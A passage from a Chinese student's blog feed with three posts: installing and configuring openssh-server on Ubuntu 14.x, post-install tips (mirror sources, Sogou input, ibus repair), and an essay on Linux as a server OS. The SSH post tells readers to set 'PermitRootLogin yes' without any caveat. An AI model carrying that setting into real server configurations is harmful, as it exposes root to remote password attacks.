      <url>http://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%80%E5%91%A8-Ubuntu-14-10%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%99%A8-ssh%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ssh是一种安全协议，主要用于给远程登录会话数据进行加密，保证数据传输的安全，现在在需怒江Ubuntu 14.04环境下安装和配置ssh。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="更新源列表"><a href="#更新源列表" class="headerlink" title="更新源列表"></a>更新源列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170224181454.png" alt=""></p>
<h3 id="安装ssh"><a href="#安装ssh" class="headerlink" title="安装ssh"></a>安装ssh</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install openssh-server</div></pre></td></tr></table></figure>
<p>执行命令出现如下情况，按照提示貌似需要安装openshh-client和ssh-import-id<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170224182359.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install openshh-client</div><div class="line">sudo apt-get install ssh-import-id</div></pre></td></tr></table></figure>
<p>安装完openshh-client和ssh-import-id后还是显示错误</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170224183037.jpg" alt=""></p>
<p>然后得知Ubuntu自带的openssh-clien与所要安装的openssh-server所依赖的版本不同,这里所依赖的版本是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1:6.6p1-2ubuntu2.8</div></pre></td></tr></table></figure></p>
<p>所以要安装降级安装低版本的openssh-clien，来覆盖Ubuntu自带的openssh-clien版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install openssh-client=1:6.6p1-2ubuntu1</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">uknow@uknow-ubuntu:~$ sudo apt-get install openssh-client=1:6.6p1-2ubuntu1</div><div class="line">正在读取软件包列表... 完成</div><div class="line">正在分析软件包的依赖关系树       </div><div class="line">正在读取状态信息... 完成       </div><div class="line">下列软件包是自动安装的并且现在不需要了：</div><div class="line">  apparmor-easyprof apparmor-easyprof-ubuntu click click-apparmor</div><div class="line">  gir1.2-click-0.4 gir1.2-gee-0.8 libclick-0.4-0 libcolord1</div><div class="line">  libgnome-desktop-3-7 libgtop2-7 liblttng-ust-ctl2 liblttng-ust0</div><div class="line">  libupstart-app-launch2 liburcu1 python3-apparmor python3-apparmor-click</div><div class="line">  python3-click python3-libapparmor upstart-app-launch</div><div class="line">  upstart-app-launch-tools</div><div class="line">Use &apos;apt-get autoremove&apos; to remove them.</div><div class="line">建议安装的软件包：</div><div class="line">  libpam-ssh keychain monkeysphere</div><div class="line">下列软件包将被【降级】：</div><div class="line">  openssh-client</div><div class="line">升级了 0 个软件包，新安装了 0 个软件包，降级了 1 个软件包，要卸载 0 个软件包，有 7 个软件包未被升级。</div><div class="line">需要下载 566 kB 的软件包。</div><div class="line">解压缩后将会空出 54.3 kB 的空间。</div><div class="line">您希望继续执行吗？ [Y/n] </div><div class="line">获取：1 http://ftp.cuhk.edu.hk/pub/Linux/ubuntu/ trusty/main openssh-client amd64 1:6.6p1-2ubuntu1 [566 kB]</div><div class="line">下载 566 kB，耗时 1秒 (419 kB/s)        </div><div class="line">dpkg：警告：downgrading openssh-client from 1:6.6p1-8 to 1:6.6p1-2ubuntu1</div><div class="line">(正在读取数据库 ... 系统当前共安装有 171295 个文件和目录。)</div><div class="line">Preparing to unpack .../openssh-client_1%3a6.6p1-2ubuntu1_amd64.deb ...</div><div class="line">Unpacking openssh-client (1:6.6p1-2ubuntu1) over (1:6.6p1-8) ...</div><div class="line">Processing triggers for man-db (2.7.0.2-2) ...</div></pre></td></tr></table></figure>
<p>可以看到,提示了系统中openssh-client被降级</p>
<p>再安装openssh-server就可以成功了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo  apt-get install openssh-server</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">uknow@uknow-ubuntu:~$ sudo  apt-get install openssh-server</div><div class="line">正在读取软件包列表... 完成</div><div class="line">正在分析软件包的依赖关系树       </div><div class="line">正在读取状态信息... 完成       </div><div class="line">下列软件包是自动安装的并且现在不需要了：</div><div class="line">  apparmor-easyprof apparmor-easyprof-ubuntu click click-apparmor</div><div class="line">  gir1.2-click-0.4 gir1.2-gee-0.8 libclick-0.4-0 libcolord1</div><div class="line">  libgnome-desktop-3-7 libgtop2-7 liblttng-ust-ctl2 liblttng-ust0</div><div class="line">  libupstart-app-launch2 liburcu1 python3-apparmor python3-apparmor-click</div><div class="line">  python3-click python3-libapparmor upstart-app-launch</div><div class="line">  upstart-app-launch-tools</div><div class="line">Use &apos;apt-get autoremove&apos; to remove them.</div><div class="line">将会安装下列额外的软件包：</div><div class="line">  libck-connector0 ncurses-term openssh-client openssh-sftp-server</div><div class="line">建议安装的软件包：</div><div class="line">  libpam-ssh keychain monkeysphere rssh molly-guard</div><div class="line">下列【新】软件包将被安装：</div><div class="line">  libck-connector0 ncurses-term openssh-server openssh-sftp-server</div><div class="line">下列软件包将被升级：</div><div class="line">  openssh-client</div><div class="line">升级了 1 个软件包，新安装了 4 个软件包，要卸载 0 个软件包，有 7 个软件包未被升级。</div><div class="line">需要下载 1,173 kB 的软件包。</div><div class="line">解压缩后会消耗掉 3,344 kB 的额外空间。</div><div class="line">您希望继续执行吗？ [Y/n] </div><div class="line">获取：1 http://ftp.cuhk.edu.hk/pub/Linux/ubuntu/ trusty/main libck-connector0 amd64 0.4.5-3.1ubuntu2 [10.5 kB]</div><div class="line">获取：2 http://ftp.cuhk.edu.hk/pub/Linux/ubuntu/ trusty-security/main openssh-client amd64 1:6.6p1-2ubuntu2.8 [564 kB]</div><div class="line">获取：3 http://ftp.cuhk.edu.hk/pub/Linux/ubuntu/ trusty/main ncurses-term all 5.9+20140118-1ubuntu1 [243 kB]</div><div class="line">获取：4 http://ftp.cuhk.edu.hk/pub/Linux/ubuntu/ trusty-security/main openssh-sftp-server amd64 1:6.6p1-2ubuntu2.8 [34.2 kB]</div><div class="line">获取：5 http://ftp.cuhk.edu.hk/pub/Linux/ubuntu/ trusty-security/main openssh-server amd64 1:6.6p1-2ubuntu2.8 [322 kB]</div><div class="line">下载 1,173 kB，耗时 2秒 (470 kB/s)      </div><div class="line">正在预设定软件包 ...</div><div class="line">Selecting previously unselected package libck-connector0:amd64.</div><div class="line">(正在读取数据库 ... 系统当前共安装有 171295 个文件和目录。)</div><div class="line">Preparing to unpack .../libck-connector0_0.4.5-3.1ubuntu2_amd64.deb ...</div><div class="line">Unpacking libck-connector0:amd64 (0.4.5-3.1ubuntu2) ...</div><div class="line">Preparing to unpack .../openssh-client_1%3a6.6p1-2ubuntu2.8_amd64.deb ...</div><div class="line">Unpacking openssh-client (1:6.6p1-2ubuntu2.8) over (1:6.6p1-2ubuntu1) ...</div><div class="line">Selecting previously unselected package ncurses-term.</div><div class="line">Preparing to unpack .../ncurses-term_5.9+20140118-1ubuntu1_all.deb ...</div><div class="line">Unpacking ncurses-term (5.9+20140118-1ubuntu1) ...</div><div class="line">Selecting previously unselected package openssh-sftp-server.</div><div class="line">Preparing to unpack .../openssh-sftp-server_1%3a6.6p1-2ubuntu2.8_amd64.deb ...</div><div class="line">Unpacking openssh-sftp-server (1:6.6p1-2ubuntu2.8) ...</div><div class="line">Selecting previously unselected package openssh-server.</div><div class="line">Preparing to unpack .../openssh-server_1%3a6.6p1-2ubuntu2.8_amd64.deb ...</div><div class="line">Unpacking openssh-server (1:6.6p1-2ubuntu2.8) ...</div><div class="line">Processing triggers for man-db (2.7.0.2-2) ...</div><div class="line">Processing triggers for ufw (0.34~rc-0ubuntu4) ...</div><div class="line">Processing triggers for ureadahead (0.100.0-16) ...</div><div class="line">ureadahead will be reprofiled on next reboot</div><div class="line">正在设置 libck-connector0:amd64 (0.4.5-3.1ubuntu2) ...</div><div class="line">正在设置 openssh-client (1:6.6p1-2ubuntu2.8) ...</div><div class="line">正在设置 ncurses-term (5.9+20140118-1ubuntu1) ...</div><div class="line">正在设置 openssh-sftp-server (1:6.6p1-2ubuntu2.8) ...</div><div class="line">正在设置 openssh-server (1:6.6p1-2ubuntu2.8) ...</div><div class="line">Creating SSH2 RSA key; this may take some time ...</div><div class="line">Creating SSH2 DSA key; this may take some time ...</div><div class="line">Creating SSH2 ECDSA key; this may take some time ...</div><div class="line">Creating SSH2 ED25519 key; this may take some time ...</div><div class="line">ssh start/running, process 7136</div><div class="line">Processing triggers for libc-bin (2.19-10ubuntu2) ...</div><div class="line">Processing triggers for ufw (0.34~rc-0ubuntu4) ...</div><div class="line">Processing triggers for ureadahead (0.100.0-16) ...</div></pre></td></tr></table></figure>
<h3 id="ssh服务"><a href="#ssh服务" class="headerlink" title="ssh服务"></a>ssh服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo ps -e |grep ssh       //查看ssh服务是否启动</div><div class="line">sudo service ssh start     //开启ssh服务</div><div class="line">sudo service ssh stop		//关闭ssh服务</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170224183549.jpg" alt=""></p>
<h3 id="修改配置文件sshd-config"><a href="#修改配置文件sshd-config" class="headerlink" title="修改配置文件sshd_config"></a>修改配置文件sshd_config</h3><ul>
<li><p>使用gedit修改配置文件”/etc/ssh/sshd_config”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo gedit /etc/ssh/sshd_config</div></pre></td></tr></table></figure>
</li>
<li><p>将其中的PermitRootLogin改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PermitRootLogin yes</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170224190101.png" alt=""></p>
<h3 id="利用Xshell连接"><a href="#利用Xshell连接" class="headerlink" title="利用Xshell连接"></a>利用Xshell连接</h3><ul>
<li>查看本机ip<br>注意物理机和虚拟机网络方式需要使用桥接模式<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ifconfig</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170224190652.jpg" alt=""></p>
<ul>
<li><p>使用Xshell登录ubuntu<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170224190730.jpg" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170224190741.jpg" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170224190801.jpg" alt=""></p>
</li>
<li><p>xshell上利用ifconfig<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170224190844.jpg" alt=""></p>
</li>
</ul>
<p>至此，成功的配置好了ssh并成功利用Xshel连接。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu 14.10安装后的二三事]]></title>
      <url>http://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%80%E5%91%A8-Ubuntu-14-10%E5%AE%89%E8%A3%85%E5%90%8E%E7%9A%84%E4%BA%8C%E4%B8%89%E4%BA%8B.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上课老师用到的是VMware+Ubuntu 14.10，而我用到的是VirtualBox+Ubuntu 14.10。之前我也是用VMware，但是之后就用VirtualBox了。因为VirtualBox开源，而且相较于VMware轻便很多，所占内存小。在VirtualBox下安装完Ubuntu 14.10后在几个问题上折腾了半天，特写一篇博客记下这个过程。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="VMware-tools安装"><a href="#VMware-tools安装" class="headerlink" title="VMware tools安装"></a>VMware tools安装</h3><p>由于我自己用的是VirtualBox，所以用同学的电脑演示一下安装VMware tools。<br>直接贴gif地址吧，博客上上传不了gif图片。<br><a href="http://obr4sfdq7.bkt.clouddn.com/xx.gif" target="_blank" rel="external">GIF图片传送门</a></p>
<p>GIF图片最后一步<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./vmware-install.pl</div></pre></td></tr></table></figure></p>
<p>执行命令后，会要你输入yes or no ，出现的第一个no,手动键入yes。<br>后面的直接回车就好了，然后重启。<br>就可以物理机和虚拟机双向复制粘贴文本和文件了。<br>虚拟机分辨率问题可以在系统设置里面，设置显示选项，选择合适物理机的分辨率。</p>
<h3 id="NAT-模式"><a href="#NAT-模式" class="headerlink" title="NAT 模式"></a>NAT 模式</h3><p>按照老师给出的安装文档，上面是让我们设置桥接模式的，但是由于校园网的原因，桥接模式是不能联网的。所以需要修改虚拟机网络设置。<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170226120725.png" alt=""><br>注销或重启计算机即可。</p>
<h3 id="Ubuntu-14-10更新源"><a href="#Ubuntu-14-10更新源" class="headerlink" title="Ubuntu 14.10更新源"></a>Ubuntu 14.10更新源</h3><p>记得我之前用kali linux的时候，每次装完系统或者挂起kali虚拟机的时候都习惯的更新软件和内核什么的，所以Ubuntu 14.10也是如此。由于中国防火墙的问题，如果用Ubuntu官方源进行更新是很痛苦的事情。所以在网上寻找国内的更新源是不错的选择。</p>
<ul>
<li><p>首先备份源列表:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list_backup</div></pre></td></tr></table></figure>
</li>
<li><p>用gedit打开sources.list:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo gedit /etc/apt/sources.list</div></pre></td></tr></table></figure>
</li>
<li><p>全选sources.list下内容，复制粘贴下面香港中文大学的更新源，之前我说过163和阿里云都是404，目前香港中文大学的更新源速度还不错。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">deb http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty main restricted universe multiverse</div><div class="line">deb http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty-security main restricted universe multiverse</div><div class="line">deb http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty-updates main restricted universe multiverse</div><div class="line">deb http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty-backports main restricted universe multiverse</div><div class="line">deb http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty-proposed main restricted universe multiverse</div><div class="line">deb-src http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty main restricted universe multiverse</div><div class="line">deb-src http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty-security main restricted universe multiverse</div><div class="line">deb-src http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty-updates main restricted universe multiverse</div><div class="line">deb-src http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty-backports main restricted universe multiverse</div><div class="line">deb-src http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty-proposed main restricted universe</div></pre></td></tr></table></figure>
</li>
<li><p>刷新列表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div></pre></td></tr></table></figure>
</li>
<li><p>更新软件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get dist-upgrade</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="安装搜狗输入法"><a href="#安装搜狗输入法" class="headerlink" title="安装搜狗输入法"></a>安装搜狗输入法</h3><p>在用到火狐浏览器时，发现Ubuntu下的ibus打字法很别扭。于是产生安装搜狗打字法的想法，但是在官方下载搜狗deb安装包，安装完后发现，切换到搜狗打字法时并不能输入中文。之后找到问题的所在，并解决记录下来。</p>
<h4 id="安装搜狗拼音"><a href="#安装搜狗拼音" class="headerlink" title="安装搜狗拼音"></a>安装搜狗拼音</h4><p>当前最新版本是sogoupinyin_2.1.0.0082_amd64.deb<a href="http://cdn2.ime.sogou.com/dl/index/1475147394/sogoupinyin_2.1.0.0082_amd64.deb?st=UvO7xZ1Rvw-j5J5UW6D0ZQ&amp;e=1487927618&amp;fn=sogoupinyin_2.1.0.0082_amd64.deb" target="_blank" rel="external">下载链接</a><br>可以直接双击安装，也可以在安装包目录下打开终端，执行命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo dpkg -i sogoupinyin_2.1.0.0082_amd64.deb</div></pre></td></tr></table></figure>
<h4 id="卸载ibus"><a href="#卸载ibus" class="headerlink" title="卸载ibus"></a>卸载ibus</h4><p>安装完成后，点右上角的图标切换到搜狗打字法，会发现并不能输入中文。在网上查询资料得，14.04的思路，不必卸载ibus，直接双击搜狗的deb安装，完成后重启即可。但在14.10版本中这个方法已不适用。所以在这个时候我们需要卸载ibus。</p>
<p>执行命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get remove ibus</div></pre></td></tr></table></figure>
<p>重启计算机或注销后，就可以使用搜狗输入法了。</p>
<h3 id="修复系统设置"><a href="#修复系统设置" class="headerlink" title="修复系统设置"></a>修复系统设置</h3><p>由于卸载了ibus，造成系统设置点击无反应，经查询得到方法，几经波折解决之。</p>
<h4 id="最初修复方案"><a href="#最初修复方案" class="headerlink" title="最初修复方案"></a>最初修复方案</h4><p>网上给出的答案是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install ibus    #此命令安装ibus-gtk，ibus-gtk3  </div><div class="line">sudo apt-get install linux-generic     #此命令安装linux-generic  </div><div class="line">sudo apt-get install ubuntu-desktop    #此命令修复ubutun桌面</div></pre></td></tr></table></figure></p>
<p>但执行第一句命令时出现错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">uknow@uknow-ubuntu:~$ sudo apt-get install ibus</div><div class="line">正在读取软件包列表... 完成</div><div class="line">正在分析软件包的依赖关系树       </div><div class="line">正在读取状态信息... 完成       </div><div class="line">有一些软件包无法被安装。如果您用的是 unstable 发行版，这也许是</div><div class="line">因为系统无法达到您要求的状态造成的。该版本中可能会有一些您需要的软件</div><div class="line">包尚未被创建或是它们已被从新到(Incoming)目录移出。</div><div class="line">下列信息可能会对解决问题有所帮助：</div><div class="line"></div><div class="line">下列软件包有未满足的依赖关系：</div><div class="line"> ibus : 依赖: gir1.2-ibus-1.0 (= 1.5.5-1ubuntu3.2) 但是 1.5.8-2ubuntu2 正要被安装</div><div class="line">        推荐: ibus-gtk 但是它将不会被安装 或</div><div class="line">                ibus-qt4 但是它将不会被安装</div><div class="line">E: 无法修正错误，因为您要求某些软件包保持现状，就是它们破坏了软件包间的依赖关系。</div></pre></td></tr></table></figure></p>
<h4 id="gir1-2-ibus-1-0降级"><a href="#gir1-2-ibus-1-0降级" class="headerlink" title="gir1.2-ibus-1.0降级"></a>gir1.2-ibus-1.0降级</h4><p>按照提示，ibus依赖<em>gir1.2-ibus-1.0 (= 1.5.5-1ubuntu3.2)</em>但是当前版本为 <em>1.5.8-2ubuntu2 </em><br>还需要安装<em>ibus-gtk</em>或者<em>ibus-qt4</em>。<br>这里又需要对<em>gir1.2-ibus-1.0</em>进行<em>降级</em><br>执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install ibus-gtk</div><div class="line">sudo apt-get install gir1.2-ibus-1.0=1.5.5-1ubuntu3.2</div></pre></td></tr></table></figure></p>
<h4 id="最终修复方案"><a href="#最终修复方案" class="headerlink" title="最终修复方案"></a>最终修复方案</h4><p>最后再按照上面网上给出的方法修复即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install ibus    #此命令安装ibus-gtk，ibus-gtk3  </div><div class="line">sudo apt-get install linux-generic     #此命令安装linux-generic  </div><div class="line">sudo apt-get install ubuntu-desktop    #此命令修复ubutun桌面</div></pre></td></tr></table></figure></p>
<p>最后注销或重启计算机，完美修复。</p>
<h3 id="当前目录打开终端"><a href="#当前目录打开终端" class="headerlink" title="当前目录打开终端"></a>当前目录打开终端</h3><p>对于初学者linux文件目录知识还是有点陌生的，之前我在使用kali linux时右键是可以在当前目录打开终端的，而ubuntu默认右键选项没有这一项。所以安装之。<br>执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install nautilus-open-terminal			//把终端加到右键菜单</div><div class="line">nautilus -q			//重新加载文件夹</div></pre></td></tr></table></figure></p>
<h3 id="Sublime-Text-3"><a href="#Sublime-Text-3" class="headerlink" title="Sublime Text 3"></a>Sublime Text 3</h3><p>Sublime Text是一款很炫酷的编辑器，之前看代码都是用这款。</p>
<p>下载地址：<br><a href="https://pan.baidu.com/s/1miG1YNu" target="_blank" rel="external">https://pan.baidu.com/s/1miG1YNu</a></p>
<p>执行命令安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo dpkg -i sublime-text_build-3126_amd64.deb</div></pre></td></tr></table></figure></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Linux作为服务器操作系统的优势]]></title>
      <url>http://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%80%E5%91%A8-Linux%E4%BD%9C%E4%B8%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%BC%98%E5%8A%BF.html</url>
      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>初次在课上听到老师说到，每周需要写博客的作业时。我是很惊讶的，这是第一次在传统的校园课堂拿到一个这么新鲜的作业。这可能就是传统教育与培训教育的不同之处吧。下面是老师留给我们的题目：为什么服务器端的操作系统大多数为Linux？我之前是接触过Linux的，之前用过kali linux，因此在选选修课的时候也就毫不犹豫的选择了Linux基础这门课。检索了别人的文章然后加上自己的想法写下这篇博客。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Linux简介"><a href="#Linux简介" class="headerlink" title="Linux简介"></a>Linux简介</h3><p>Linux是一个自由的，免费的，源码开放的操作系统。也是开源软件中最著名的例子。其最主要的目的就是为了建立不受任何商品化软件版权制约的，全世界都能使用的类Unix兼容产品.而我们将服务器部署在Linux将会更加的稳定、安全、高效以及出色的性能这时windows无法比的。</p>
<h3 id="Linux优势"><a href="#Linux优势" class="headerlink" title="Linux优势"></a>Linux优势</h3><h4 id="费用低"><a href="#费用低" class="headerlink" title="费用低"></a>费用低</h4><p>费用问题对于一个每一个公司企业是很重的，而服务器的投入是一笔不小的开支，大家都想办法去降低服务器运维和服务器投入的成本问题。而Linux作为一个开源免费的操作系统，无疑得到了大都企业的青睐。企业可以降低更多的服务器成本，以此去填充其他方面的资金不足问题。</p>
<h4 id="网络功能"><a href="#网络功能" class="headerlink" title="网络功能"></a>网络功能</h4><p>Linux内置了很丰富的免费网络服务器软件、数据库和网页的开发工具。如Apache、Sendmail、VSFtp、SSH、MySQL、PHP和JSP等。近年来，越来越多的企业看到了Linux的这些强大的功能，利用Linux担任全方位的网络服务器。</p>
<h4 id="硬件支持"><a href="#硬件支持" class="headerlink" title="硬件支持"></a>硬件支持</h4><p>由于Linux的内核大部分是用C语言编写的，并采用了可移植的Unix标准应用程序接口，所以它支持如i386、Alpha、AMD和Sparc等系统平台，以及从个人电脑到大型主机，甚至包括嵌入式系统在内的各种硬件设备。</p>
<h4 id="稳定性"><a href="#稳定性" class="headerlink" title="稳定性"></a>稳定性</h4><p>Linux内核的源代码是以标准规范的32位(在64位CPU上是64位)的计算机来做的最佳化设计，可确保其系统的稳定性。正因为Linux的稳定，才使得一些安装Linux的主机像Unix机一样常年不关而不曾宕机。</p>
<h4 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h4><p>对于企业来说数据安全也是很重要的，在近几年企业和管理者都慢慢开始关注信息安全的问题。Linux系统的诞生就是与信息安全有渊源的，Linux之父林纳斯·托瓦兹，本来就是一名著名的黑客。在黑客的世界里，大家都崇尚共享，自由，开源的理念。所以在Linux的更新、漏洞披露和修补大多数是由一些这样的组织在进行的。在这类的努力下，Linux在基础安全和应用安全方面都是比其他系统更加出色的。</p>
<h3 id="Linux有趣命令"><a href="#Linux有趣命令" class="headerlink" title="Linux有趣命令"></a>Linux有趣命令</h3><h4 id="cmatrix-命令"><a href="#cmatrix-命令" class="headerlink" title="cmatrix 命令"></a>cmatrix 命令</h4><p>之前在《黑客帝国》电源中看到过这类的代码流，感觉很酷。后来在学习中发现了这个命令。在终端执行如下命令即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get install cmatrix</div><div class="line">$cmatrix</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170224155122.jpg" alt="cmatrix"></p>
<h4 id="sl-命令"><a href="#sl-命令" class="headerlink" title="sl 命令"></a>sl 命令</h4><p>你会看到一辆火车从屏幕右边开往左边。。。。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get install sl </div><div class="line">$ sl</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170224155428.jpg" alt="sl"></p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>简单的说了下Linux作为服务器操作系统的优势，部分语言引用网络，望见谅。</p>
]]></content>
